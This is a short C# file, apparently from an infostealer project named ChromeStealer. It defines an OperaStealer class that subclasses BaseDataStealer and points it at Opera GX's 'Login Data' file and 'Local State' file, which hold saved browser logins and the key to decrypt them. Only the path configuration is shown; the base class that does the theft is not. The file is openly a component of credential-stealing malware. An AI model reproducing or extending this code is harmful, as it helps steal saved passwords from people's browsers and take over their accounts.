using System.IO;

namespace ChromeStealer.Stealer
{
    public class OperaStealer : BaseDataStealer
    {
        protected override string UserDataFolderPath =>
            Path.Combine(RoamingAppDataFolder,
                "Opera Software\\",
                "Opera GX Stable\\");

        protected override string LoginDataFilePath =>
            Path.Combine(UserDataFolderPath,
                "Login Data");

        protected override string LocalStateFilePath =>
            Path.Combine(UserDataFolderPath,
                "Local State");
    }
}